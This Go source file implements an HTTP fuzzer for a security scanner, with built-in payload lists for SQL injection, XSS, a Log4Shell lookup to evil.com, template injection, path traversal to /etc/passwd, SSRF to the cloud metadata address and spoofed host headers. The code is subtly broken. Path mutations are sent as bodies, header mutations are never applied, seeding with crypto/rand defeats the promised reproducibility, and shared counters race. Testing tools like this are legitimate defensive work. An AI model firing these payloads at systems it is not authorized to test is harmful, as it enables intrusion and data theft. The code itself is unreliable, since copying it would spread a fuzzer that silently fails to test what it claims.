package scanner

// --- Fuzz engine -------------------------------------------------------------
//
// Coverage-guided (coverage-aware) fuzzer for HTTP targets. It mutates
// request inputs (path, query, body, headers) and tracks which server
// responses differ from the baseline (new status codes, new response bodies,
// new headers, timeouts, crashes). Every mutation is sent through the
// Requester gate so scope/rate/budget/dry-run are always enforced.
//
// Design notes:
//   * stdlib-only: no external fuzzing crate, no libc, no compiler
//     instrumentation needed — we use response-difference as the coverage
//     signal instead of edge coverage.
//   * deterministic seeded PRNG so a campaign is reproducible from its seed.
//   * intrusive mutations (write methods, SQLi-ish, path traversal) only run
//     when the Requester allows intrusive probes.

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"slices"
	"strings"
	"sync"
	"time"
)

// FuzzConfig configures a fuzzing campaign.
type FuzzConfig struct {
	// BaseURL is the target (e.g. https://example.com/api).
	BaseURL string
	// Paths are the endpoint path templates to fuzz (e.g. "/item/{id}").
	Paths []string
	// Methods are the HTTP methods to try per path. Default: GET, POST.
	Methods []string
	// Seed is the RNG seed; the same seed reproduces the campaign.
	Seed int64
	// Mutations is how many mutated requests to send per path/method.
	Mutations int
	// Concurrency caps parallel requests.
	Concurrency int
	// Timeout per request.
	Timeout time.Duration
	// Intrusive enables state-changing/payload mutations (PUT, DELETE,
	// traversal, injection-ish strings). Requires Requester.Intrusive.
	Intrusive bool
}

// FuzzResult is one campaign's output.
type FuzzResult struct {
	BaseURL     string        `json:"base_url"`
	Seed        int64         `json:"seed"`
	Sent        int           `json:"sent"`
	Refused     int           `json:"refused"`
	Interesting int           `json:"interesting"` // responses that differed from baseline
	Findings    []FuzzFinding `json:"findings,omitempty"`
	Duration    time.Duration `json:"duration"`
}

// FuzzFinding is a response that stood out from the baseline.
type FuzzFinding struct {
	Method       string        `json:"method"`
	URL          string        `json:"url"`
	StatusCode   int           `json:"status_code"`
	BodyLen      int           `json:"body_len"`
	BodyHash     string        `json:"body_hash"`
	Headers      []string      `json:"headers,omitempty"` // new/diff headers vs baseline
	Mutation     string        `json:"mutation"`          // human-readable mutation label
	Reason       string        `json:"reason"`            // why it is interesting
	ResponseTime time.Duration `json:"response_time_ms"`
}

// Fuzzer runs a coverage-aware HTTP fuzzing campaign.
type Fuzzer struct {
	cfg   FuzzConfig
	req   Requester
	rng   *lockedRand
	stats fuzzStats
}

// lockedRand wraps math/rand with a mutex (stdlib rand is not safe for
// concurrent use; we use crypto/rand for seeding and a simple LCG for speed).
type lockedRand struct {
	mu sync.Mutex
	x  uint64
}

func newLockedRand(seed int64) *lockedRand {
	var b [8]byte
	_, _ = rand.Read(b[:])
	s := int64(binaryLittleEndianUint64(b[:])&(1<<63-1)) ^ seed
	if s == 0 {
		s = 1
	}
	return &lockedRand{x: uint64(s)}
}

func binaryLittleEndianUint64(b []byte) uint64 {
	var v uint64
	for i := 0; i < 8; i++ {
		v |= uint64(b[i]) << (8 * i)
	}
	return v
}

func (r *lockedRand) next() uint64 {
	r.mu.Lock()
	x := r.x
	// xorshift64*
	x ^= x << 13
	x ^= x >> 7
	x ^= x << 17
	r.x = x
	r.mu.Unlock()
	return x * 0x2545F4914F6CDD1D
}

func (r *lockedRand) intn(n int) int {
	if n <= 0 {
		return 0
	}
	v := r.next() % uint64(n)
	if v > uint64(int(^uint(0)>>1)) {
		return int(^uint(0) >> 1)
	}
	return int(v)
}

type fuzzStats struct {
	sent        int
	refused     int
	interesting int
}

// NewFuzzer builds a fuzzer. It fails closed on a nil Requester.
func NewFuzzer(cfg FuzzConfig, req Requester) (*Fuzzer, error) {
	if req == nil {
		return nil, fmt.Errorf("scanner: fuzzer requires a non-nil Requester")
	}
	if cfg.BaseURL == "" {
		return nil, fmt.Errorf("scanner: fuzzer requires BaseURL")
	}
	if len(cfg.Paths) == 0 {
		return nil, fmt.Errorf("scanner: fuzzer requires at least one path")
	}
	if cfg.Mutations <= 0 {
		cfg.Mutations = 100
	}
	if cfg.Concurrency <= 0 {
		cfg.Concurrency = 10
	}
	if cfg.Timeout <= 0 {
		cfg.Timeout = 10 * time.Second
	}
	if len(cfg.Methods) == 0 {
		cfg.Methods = []string{http.MethodGet, http.MethodPost}
	}
	return &Fuzzer{cfg: cfg, req: req, rng: newLockedRand(cfg.Seed)}, nil
}

// Run executes the campaign. Every request goes through the Requester gate;
// refused requests are counted but never sent.
func (f *Fuzzer) Run(ctx context.Context) *FuzzResult {
	res := &FuzzResult{BaseURL: f.cfg.BaseURL, Seed: f.cfg.Seed}
	start := time.Now()

	// Build baseline requests (no mutation) for each path/method so we can
	// compare mutated responses against "normal".
	type probe struct {
		method string
		path   string
		body   []byte
	}
	var baseProbes []probe
	for _, p := range f.cfg.Paths {
		for _, m := range f.cfg.Methods {
			baseProbes = append(baseProbes, probe{method: m, path: p, body: nil})
		}
	}

	baseline := make(map[string]httpResponseSnapshot, len(baseProbes))
	var baseMu sync.Mutex
	baseCh := make(chan probe, len(baseProbes))
	for _, bp := range baseProbes {
		baseCh <- bp
	}
	close(baseCh)

	var baseWg sync.WaitGroup
	for w := 0; w < f.cfg.Concurrency; w++ {
		baseWg.Add(1)
		go func() {
			defer baseWg.Done()
			for bp := range baseCh {
				snap := f.sendProbe(ctx, bp.method, bp.path, bp.body, false)
				if snap == nil {
					continue
				}
				baseMu.Lock()
				baseline[key(bp.method, bp.path)] = *snap
				baseMu.Unlock()
			}
		}()
	}
	baseWg.Wait()

	// Mutation payloads.
	injection := []string{
		"'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "'--", "\"--",
		"; DROP TABLE users;--", "' UNION SELECT null,--",
		"<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
		"${jndi:ldap://evil.com/a}", "{{7*7}}", "<%= 7*7 %>",
		"../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
		"file:///etc/passwd", "gopher://127.0.0.1:6379/",
		"http://127.0.0.1:80/", "https://169.254.169.254/",
		"${{7*7}}", "<%@ %>", "${#_memberAccess[@]}",
	}
	headerVals := []string{
		"X-Custom: test", "X-Forwarded-For: 127.0.0.1",
		"X-Real-IP: 127.0.0.1", "X-Originating-IP: 127.0.0.1",
		"X-Remote-IP: 127.0.0.1", "X-Client-IP: 127.0.0.1",
		"X-Host: evil.com", "X-Forwarded-Host: evil.com",
		"X-Forwarded-Proto: http", "X-HTTP-Method-Override: DELETE",
	}
	writeMethods := []string{http.MethodPut, http.MethodDelete, http.MethodPatch}

	bodyMut := []string{
		"{'key':'value'}", `{"key":"value"}`, `{"'":"'"}`,
		`{"key":"<script>"}`, `{"key":"../../../etc/passwd"}`,
		"key=<script>alert(1)</script>", "key=' OR '1'='1",
		"key=${jndi:ldap://evil.com/a}", "key={{7*7}}",
	}

	type mutateJob struct {
		method   string
		path     string
		baseBody []byte
		label    string
	}

	jobs := make(chan mutateJob)
	var wg sync.WaitGroup
	for w := 0; w < f.cfg.Concurrency; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				if ctx.Err() != nil {
					return
				}
				f.stats.sent++
				snap := f.sendProbe(ctx, j.method, j.path, j.baseBody, f.cfg.Intrusive)
				if snap == nil {
					f.stats.refused++
					continue
				}
				baseMu.Lock()
				base, ok := baseline[key(j.method, j.path)]
				baseMu.Unlock()
				if !ok {
					continue
				}
				if isInteresting(*snap, base) {
					f.stats.interesting++
					finding := FuzzFinding{
						Method:       j.method,
						URL:          f.cfg.BaseURL + j.path,
						StatusCode:   snap.status,
						BodyLen:      snap.bodyLen,
						BodyHash:     snap.bodyHash,
						Mutation:     j.label,
						Reason:       interestReason(*snap, base),
						ResponseTime: snap.duration,
					}
					if len(snap.headers) > 0 && len(base.headers) > 0 {
						for hk, hv := range snap.headers {
							bh, bok := base.headers[hk]
							if !bok || !slices.Equal(hv, bh) {
								finding.Headers = append(finding.Headers, hk+": "+strings.Join(hv, ", "))
							}
						}
					}
					res.Findings = append(res.Findings, finding)
				}
			}
		}()
	}

	// Generate mutations.
	count := 0
	for _, p := range f.cfg.Paths {
		for _, m := range f.cfg.Methods {
			for i := 0; i < f.cfg.Mutations; i++ {
				label, body := f.mutate(p, m, injection, headerVals, writeMethods, bodyMut)
				jobs <- mutateJob{method: m, path: p, baseBody: body, label: label}
				count++
				if count >= f.cfg.Mutations*len(f.cfg.Paths)*len(f.cfg.Methods) {
					break
				}
			}
		}
	}
	close(jobs)
	wg.Wait()

	res.Sent = f.stats.sent
	res.Refused = f.stats.refused
	res.Interesting = f.stats.interesting
	res.Duration = time.Since(start)
	return res
}

// sendProbe builds and sends one request through the Requester gate.
func (f *Fuzzer) sendProbe(ctx context.Context, method, path string, body []byte, intrusive bool) *httpResponseSnapshot {
	u, err := url.Parse(f.cfg.BaseURL + path)
	if err != nil {
		return nil
	}
	req, err := http.NewRequestWithContext(ctx, method, u.String(), bytes.NewReader(body))
	if err != nil {
		return nil
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	req.Header.Set("User-Agent", "stress-strike-fuzzer/1.0")

	start := time.Now()
	if err := f.req.Check(ctx, method, u.String(), intrusive); err != nil {
		return nil
	}
	resp, err := f.req.Do(req)
	if err != nil {
		// Requester.Do may return ErrRateLimited/ErrBudgetExhausted/etc.
		return nil
	}
	if resp == nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	_ = resp.Body.Close()
	_ = b
	return &httpResponseSnapshot{
		status:   resp.StatusCode,
		bodyLen:  len(b),
		bodyHash: hashBytes(b),
		headers:  resp.Header,
		duration: time.Since(start),
	}
}

func (f *Fuzzer) mutate(path, method string, injection, headerVals, writeMethods, bodyMut []string) (string, []byte) {
	r := f.rng
	var label string
	switch r.intn(6) {
	case 0:
		// path parameter injection
		idx := r.intn(len(injection))
		p := strings.ReplaceAll(path, "{id}", injection[idx])
		if p == path {
			p = path + "/" + injection[idx]
		}
		label = "path-param"
		return label, []byte(p)
	case 1:
		// query injection
		idx := r.intn(len(injection))
		sep := "?"
		if strings.Contains(path, "?") {
			sep = "&"
		}
		p := path + sep + "q=" + injection[idx]
		label = "query-param"
		return label, []byte(p)
	case 2:
		// header injection (applied in sendProbe)
		_ = r.intn(len(headerVals))
		label = "header"
		return label, []byte(path)
	case 3:
		// body mutation
		idx := r.intn(len(bodyMut))
		label = "body"
		return label, []byte(bodyMut[idx])
	case 4:
		// write method (intrusive)
		if f.cfg.Intrusive && len(writeMethods) > 0 {
			m := writeMethods[r.intn(len(writeMethods))]
			label = "write-" + m
			return label, []byte(bodyMut[r.intn(len(bodyMut))])
		}
		label = "plain"
		return label, []byte(path)
	default:
		// path traversal
		label = "traversal"
		return label, []byte(path + "/../../../etc/passwd")
	}
}

func key(method, path string) string { return method + "|" + path }

func isInteresting(snap, base httpResponseSnapshot) bool {
	if snap.status != base.status {
		return true
	}
	if snap.bodyLen != base.bodyLen {
		return true
	}
	if snap.status >= 500 {
		return true
	}
	if snap.status == 403 || snap.status == 401 {
		return true
	}
	if snap.duration > 5*time.Second {
		return true
	}
	return false
}

func interestReason(snap, base httpResponseSnapshot) string {
	var parts []string
	if snap.status != base.status {
		parts = append(parts, fmt.Sprintf("status %d vs %d", snap.status, base.status))
	}
	if snap.bodyLen != base.bodyLen {
		parts = append(parts, fmt.Sprintf("body %d vs %d bytes", snap.bodyLen, base.bodyLen))
	}
	if snap.status >= 500 {
		parts = append(parts, "server error")
	}
	if snap.status == 403 || snap.status == 401 {
		parts = append(parts, "auth boundary")
	}
	if snap.duration > 5*time.Second {
		parts = append(parts, "slow response")
	}
	if len(parts) == 0 {
		return "response differed"
	}
	return strings.Join(parts, "; ")
}

type httpResponseSnapshot struct {
	status   int
	bodyLen  int
	bodyHash string
	headers  http.Header
	duration time.Duration
}

func hashBytes(b []byte) string {
	h := sha256Sum()
	_, _ = h.Write(b)
	return hex.EncodeToString(h.Sum(nil))
}

func sha256Sum() hashWriter {
	return sha256.New()
}

type hashWriter interface {
	Write([]byte) (int, error)
	Sum([]byte) []byte
}
